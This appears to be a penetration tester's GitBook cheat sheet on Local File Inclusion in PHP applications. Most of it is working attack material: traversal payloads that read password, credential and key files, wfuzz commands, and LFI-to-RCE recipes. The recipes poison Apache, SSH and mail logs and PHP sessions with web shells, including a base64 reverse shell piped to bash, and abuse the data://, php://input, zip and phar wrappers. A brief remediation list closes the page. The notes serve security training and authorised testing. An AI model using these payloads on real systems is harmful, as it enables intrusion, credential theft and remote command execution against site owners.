# LFI

This vuln is based on **Directory Path Transversal**. It may happen with parameters like page, file, pagename, filename, page...., file....

{% hint style="info" %}
Some files can exist without the termination, e.g. /var/log/auth instead of /var/log/auth.log
{% endhint %}

Unlike directory traversals that simply display the contents of a file, file inclusion vulnerabilities allow an attacker to include a file into the application's running code (they execute the files using include on PHP or other methods/technologies).

{% code overflow="wrap" %}
```bash
# In the case of PHP (Windows), the version of the language runtime and web server configurations, specifically php.ini 
# Values such as register_globals and allow_url wrappers, make a considerable difference in how these vulnerabilities can be exploited.
The php.ini file on W10 can be found at C:\xampp\php\php.ini 
```
{% endcode %}



{% hint style="info" %}
* Poison logs if the service account running the server has read permission over the logs
* Poison PHP session files
* Accessing application secrets like database passwords by pulling source code and configuration files
* Enumerating processes under /proc to leak sensitive environment stuff, passwords on command line
* Reading bash history files or private keys from users home directories
* Change GET to POST and play w/ parameter
* Check other variable headers such as cookies
{% endhint %}

## Resources

{% code overflow="wrap" %}
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#basic-lfi
```
{% endcode %}

{% hint style="success" %}
PARAMETER FINDING

try parameter with FUZZ=known\_file\_that\_exists such as index.html, not only FUZZ=something
{% endhint %}

## Basic payloads

<pre class="language-bash"><code class="lang-bash">/etc/passwd
/etc/lsb-release
/etc/apache2/.htpasswd
/etc/group
/proc/sched_debug --> processes
/proc/net/fib_trie --> network addresses
<strong>/proc/net/tcp --> see internal ports in hex, convert them
</strong>/etc/exports #Check NFS section  

../../../../etc/passwd
#curl -> add --path-as-is to curl in order to keep ../../

c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/windows/system32/drivers/etc/hosts

# INTERESTING FILES TO CHECK OUT
https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks
.bashrc, .bash_history, .ssh_foler, /etc/hosts...

# ALSO TRY TO POINT TO THE RESOURCES OF THE WEBSITE (INTERNAL WEBPAGES).
# FOR EXAMPLE, IF THERE IS A DASHBOARD PHP WEB, TRY THIS:
?page=dashboard.php
?page=dashboard
</code></pre>

## Windows

{% hint style="info" %}
Default web directory _\inetpub\wwwroot_
{% endhint %}

<table data-header-hidden><thead><tr><th>Interesting Windows files and its locations</th><th data-hidden></th><th data-hidden></th></tr></thead><tbody><tr><td><a href="https://www.nirsoft.net/articles/saved_password_location.html">https://www.nirsoft.net/articles/saved_password_location.html</a></td><td></td><td></td></tr><tr><td><a href="https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt">https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt</a></td><td></td><td></td></tr><tr><td><a href="https://soffensive.github.io/posts/web-app-sec/2018-06-19-exploiting-blind-file-reads-path-traversal-vulnerabilities-on-microsoft-windows-operating-systems/">https://soffensive.github.io/posts/web-app-sec/2018-06-19-exploiting-blind-file-reads-path-traversal-vulnerabilities-on-microsoft-windows-operating-systems/</a></td><td></td><td></td></tr></tbody></table>

## Fuzzing with wordlists

{% code overflow="wrap" fullWidth="true" %}
```bash
# BEST DICTIONARIES / WORDLISTS
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
mail-masta-wordlist.txt
Fuzzing/LFI/LFISuite-pathtotest-huge.txt
# Add /etc/apache2/.htpasswd to our custom wordlists

wfuzz -c -t 400 --hc=404 -u "http://.../fetchmeafile.php?file=FUZZ" -w dic.txt -H "Authorization: Basic anVsaXVzLmI6d0pXbTRDZ1YyNg==" --hw 39,57

# -w $DICT --> dictionary with typical system files (/etc/passwd and so on)
# -H $HEADER --> e.g. 'Cookie: PHPESSID=sdflkjsd' IMPORTANT FOR AUTHENTICATED PAGES
# --hw --> hide some responses that are useless or not found
```
{% endcode %}

## Fuzzing web parameters

[https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz\_For\_Web](https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web)

{% code overflow="wrap" fullWidth="true" %}
```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something
```
{% endcode %}

## LFI to RCE

### Log poisoning

| [https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)                                     |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) |

{% code overflow="wrap" fullWidth="true" %}
```bash
/var/log/auth.log
/var/log/vsftpd.log
/var/log/apache2/access.log
/var/log/mail.log

########## APACHE LOG POISONING  --- #Poison the log with a request
- Find LFI and access /var/log/apache2/access.log successfully
- Burp -> use original GET/POST e.g. index.php?page=file.php ->  modify User-Agent -> Mozilla/5.0 <?php echo system($_GET['cmd']); ?> -> delete Referer header before sending the request
- Burp -> delete User-Agent header -> access /var/log/apache2/access.log&cmd=id
# Windows -> possible paths
C:\xampp\apache\logs
############# ANOTHER OPTION
User-Agent: Mozilla/5.0 <?php ... ?>
# Next file inclusion to the log w/o the User-Agent on the request
# Poisoning on Windows, we should understand that the log files are located in application-specific paths like
C:\xampp\apache\logs\
There are other technologies such as JSP, ASP and Node.js that might ve vulnerable to LFI. In that case, the language code for the payloadwould change.
nc -nv $TARGET_IP $TARGET_PORT
(UNKNOWN) ... open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> 
# Alternative
GET <?php system($_GET['cmd']);?> HTTP/1.1
# Press enter. We might get a response like this
HTTP/1.1 400 Bad Request
...
#Now visit the apache log to achieve RCE
└─$ curl -s 'http://$IP:$PORT/index.php?file=../../../../var/log/apache2/access.log&cmd=id' | html2text | tail
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
http://$IP/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig

############### SSH
ssh '<?php system($_GET['cmd']); ?>'@192.168.1.129
ssh '<?php system("echo $BASE64_REVSHELL | base64 -d | bash"); ?>'

############## MAIL
# First we need to know a valid SMTP user or enumerate it to be able to send him/her an email
smtp-user-enum -m VRFY -u $USER $TARGET_IP $SMTP_PORT # instead of a user we could bf a username list
# Send an email using swaks for example
swaks --to $TARGET_USER --from myuser --header "Subject: Testing!" --body "ignore this message" --server $TARGET_IP
# Now if we use LFI to locate /var/mail/$TARGET_USER file, we should see the previous email
# If so, now do the same but including PHP code on the body:
swaks --to $TARGET_USER --from myuser --header "Subject: Testing!" --body '<?php system($_REQUEST["cmd"]); ?>' --server $TARGET_IP
# Now if we include LFI again with /var/mail/$TARGET_USER&cmd=id we should achieve RCE
```
{% endcode %}

### PHP wrappers

| [https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)                                                                 |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html](https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html) |

### Filter Chain Generator

```
#FILTER CHAIN GENERATOR (CHECK IT, GREAT OPTION)
https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "Testing..."
python3 php_filter_chain_generator.py --chain "<?php system($_GET['cmd') ?>"
```

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.php.net/manual/en/wrappers.php

php://filter # useful to read PHP code instead of interpreting the file.
php://filter/resource=admin.php
/index.php?page=php://filter/convert.base64-encode/resource=admin.php
# data:// wrapper to achieve code exection (embed data elements as plaintext or base64-encoded data in the running web application’s code, good when we cannot poison a local file
http://$IP/main.php?file=data:text/plain,hello world # to check
http://$IP/main.php?file=data:text/plain,<?php echo shell_exec("dir") ?> # to exploit
data://text/plain,<?php%20echo%20system('ls');?>"
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E
"http://$IP/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
data://text/plain;base64,$BASE64&cmd=ls
# data:// will not work by default, it needs allow_url_include
# php://input
http://example.com/index.php?page=php://input&cmd=ls
    POST: <?php system($_GET['cmd']); ?>
http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
    POST: <?php system('uname -a');die(); ?>
expect://whoami
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
#READING FILES
file:///etc/passwd
# ZIP Wrapper
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
http://example.com/index.php?page=zip://shell.jpg%23payload.php
# Loop through file descriptors
curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -

#BURPSUITE
POST /info.php?param=php://input
[HEADERS]
...
<?php system("id"); ?>
```
{% endcode %}

### Useful Functions & disable\_functions/command execution bypass

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/teambi0s/dfunc-bypasser
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass
https://github.com/TarlogicSecurity/Chankro

phar:// -> https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/#wrapper-phar
The phar:// wrapper works with the format phar://[archive path]/[file inside the archive]

Alternative -> explains it is a wrapper that allows archive execution of the file inside the archive. That means we can create a malicious PHP file (file.php) for example, archive it as ZIP (file.zip) and then access it like phar:///file.zip/file.php 

In case some extensions as .zip are blacklisted, rename file.zip to file.txt or any other.
```
{% endcode %}

### phpinfo()

{% hint style="info" %}
Load phpinfo() on a file and see if we can leverage any function to achieve RCE.

If a function is disabled, research how to **bypass** **disabled functions (**&#x64;isabled\_functions).
{% endhint %}

### PHP session

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions

<strong>/var/lib/php5/sess\[PHPSESSID]
</strong>/var/lib/php/sessions/sess_&#x3C;php session id>
# Then look for vulnerable cookie/query parameters (GET for example) and URL encode them with a command such as 
Cookie: PHPSESSID=ccr0nvn3hp9nbe3631drnf7ba1; user_pref=&#x3C;%3fphp+system('cat+/etc/passwd')%3b%3f>
# OR
http://website.com?page=&#x3C;%3fphp+system('cat+/etc/passwd')%3b%3f>
# Another option is to inject &#x3C;?php echo phpinfo(); ?>
# First this in the input field
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
# Then add &#x26;cmd=whoami

# ON WINDOWS
https://stackoverflow.com/questions/37603993/php-sessions-default-save-location-for-windows
Default location C:\Windows\Temp
\windows\temp\sess_$PHPESSID
# Next I try to register as whoami
&#x3C;?php system("whoami") ?>
# If it does not work, it must be some sort of filtering ongoing. Try
a&#x3C;?php echo `whoami` ?>b
&#x3C;?=`whoami`?>

Now If going to that PHP session I can see the results
Then for other commands (or even before) it is useful to check bad characters (try to make a Python script to register and see which are the badchars or check Python scripting examples here on Gitbook)
This would be a good option
&#x3C;?php echo `powershell /enc ...` ?>
# Now we could upload nc.exe and run it to get a reverse shell (this is just one option among many others)
</code></pre>

### PHP assert function

[https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)

## Automatic tools

```bash
# DotDotPwn - The Directory Traversal Fuzzer
#https://tools.kali.org/information-gathering/dotdotpwn
dotdotpwn.pl -m $PROTOCOL -h $HOST -M $METHOD
dotdotpwn.pl -m http -h 10.0.0.235 -M GET

#LFI Suite - Automatic LFI Scanner
https://github.com/D35m0nd142/LFISuite
```

## Remediations

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4.  Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as

    ### allow\_url\_fopen

    on and

    ### allow\_url\_include
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.
